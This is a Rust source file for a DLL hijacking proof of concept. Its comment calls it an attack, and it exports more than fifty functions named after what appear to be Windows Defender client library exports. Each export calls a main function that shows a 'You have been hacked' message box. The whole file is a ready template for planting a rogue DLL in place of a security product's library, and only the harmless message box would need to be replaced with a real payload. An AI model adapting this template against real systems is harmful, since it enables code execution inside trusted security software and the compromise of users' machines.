use std::os::raw::c_void;

use windows::{
    core::PCSTR,
    Win32::{
        Foundation::{BOOL, HANDLE, HWND},
        UI::WindowsAndMessaging::{MessageBoxA, MESSAGEBOX_STYLE},
    },
};

/*
DLL Hijackng Attack:
    Place exports of the vuln dll here and make sure they call the main function
    make sure to have the #[no_mangle] macro above each func name
    Make sure this dll is placed
*/

#[no_mangle]
extern "C" fn MpGetTPStateInfo() {
    main();
}
#[no_mangle]
extern "C" fn MpConfigGetValue() {
    main();
}
#[no_mangle]
extern "C" fn MpConfigSetValue() {
    main();
}
#[no_mangle]
extern "C" fn MpConfigClose() {
    main();
}
#[no_mangle]
extern "C" fn MpClientUtilExportFunctions() {
    main();
}
#[no_mangle]
extern "C" fn MpGetTSModeInfo() {
    main();
}
#[no_mangle]
extern "C" fn MpConfigInitialize() {
    main();
}
#[no_mangle]
extern "C" fn MpManagerEnable() {
    main();
}
#[no_mangle]
extern "C" fn MpWDEnable() {
    main();
}
#[no_mangle]
extern "C" fn MpUpdatePlatform() {
    main();
}
#[no_mangle]
extern "C" fn MpRollbackPlatform() {
    main();
}
#[no_mangle]
extern "C" fn MpUnblockPlatform() {
    main();
}
#[no_mangle]
extern "C" fn MpUnblockEngine() {
    main();
}
#[no_mangle]
extern "C" fn MpUnblockSignatures() {
    main();
}
#[no_mangle]
extern "C" fn MpConfigGetValueAlloc() {
    main();
}
#[no_mangle]
extern "C" fn MpConfigUninitialize() {
    main();
}
#[no_mangle]
extern "C" fn MpThreatOpen() {
    main();
}
#[no_mangle]
extern "C" fn MpThreatEnumerate() {
    main();
}
#[no_mangle]
extern "C" fn MpScanResult() {
    main();
}
#[no_mangle]
extern "C" fn MpScanControl() {
    main();
}
#[no_mangle]
extern "C" fn MpScanStartEx() {
    main();
}
#[no_mangle]
extern "C" fn MpCleanOpen() {
    main();
}
#[no_mangle]
extern "C" fn MpCleanStart() {
    main();
}
#[no_mangle]
extern "C" fn MpConfigOpen() {
    main();
}
#[no_mangle]
extern "C" fn MpManagerStatusQuery() {
    main();
}
#[no_mangle]
extern "C" fn MpRemoveDynamicSignatureFile() {
    main();
}
#[no_mangle]
extern "C" fn MpDynamicSignatureOpen() {
    main();
}
#[no_mangle]
extern "C" fn MpFreeMemory() {
    main();
}
#[no_mangle]
extern "C" fn MpDynamicSignatureEnumerate() {
    main();
}
#[no_mangle]
extern "C" fn MpGetTaskSchedulerStrings() {
    main();
}
#[no_mangle]
extern "C" fn MpGetTDTFeatureStatusEx() {
    main();
}
#[no_mangle]
extern "C" fn MpGetTDTFeatureStatus() {
    main();
}
#[no_mangle]
extern "C" fn MpConfigIteratorOpen() {
    main();
}
#[no_mangle]
extern "C" fn MpConfigIteratorEnum() {
    main();
}
#[no_mangle]
extern "C" fn MpConfigIteratorClose() {
    main();
}
#[no_mangle]
extern "C" fn MpNetworkCapture() {
    main();
}
#[no_mangle]
extern "C" fn MpConfigDelValue() {
    main();
}
#[no_mangle]
extern "C" fn MpQuarantineRequest() {
    main();
}
#[no_mangle]
extern "C" fn MpManagerStatusQueryEx() {
    main();
}
#[no_mangle]
extern "C" fn MpUpdateStart() {
    main();
}
#[no_mangle]
extern "C" fn MpSampleQuery() {
    main();
}
#[no_mangle]
extern "C" fn MpSampleSubmit() {
    main();
}
#[no_mangle]
extern "C" fn MpConveySampleSubmissionResult() {
    main();
}
#[no_mangle]
extern "C" fn MpGetSampleChunk() {
    main();
}
#[no_mangle]
extern "C" fn MpQueryEngineConfigDword() {
    main();
}
#[no_mangle]
extern "C" fn MpGetDeviceControlSecurityPolicies() {
    main();
}
#[no_mangle]
extern "C" fn MpSetTPState() {
    main();
}
#[no_mangle]
extern "C" fn MpManagerVersionQuery() {
    main();
}
#[no_mangle]
extern "C" fn MpAllocMemory() {
    main();
}
#[no_mangle]
extern "C" fn MpHandleClose() {
    main();
}
#[no_mangle]
extern "C" fn MpAddDynamicSignatureFile() {
    main();
}
#[no_mangle]
extern "C" fn MpUtilsExportFunctions() {
    main();
}
#[no_mangle]
extern "C" fn MpManagerOpen() {
    main();
}
#[no_mangle]
extern "C" fn MpUpdateStartEx() {
    main();
}
#[no_mangle]
extern "C" fn main() {
    unsafe {
        MessageBoxA(
            HWND(0 as *mut c_void),
            PCSTR("You have been hacked\x00".as_ptr()),
            PCSTR("DLL HIJACKED\x00".as_ptr()),
            MESSAGEBOX_STYLE(0),
        );
    }
}

#[no_mangle]
#[allow(non_snake_case, unused_variables)]
extern "system" fn DllMain(hinst: HANDLE, reason: u32, reserved: &u32) -> BOOL {
    match reason {
        _ => BOOL(1),
    }
}
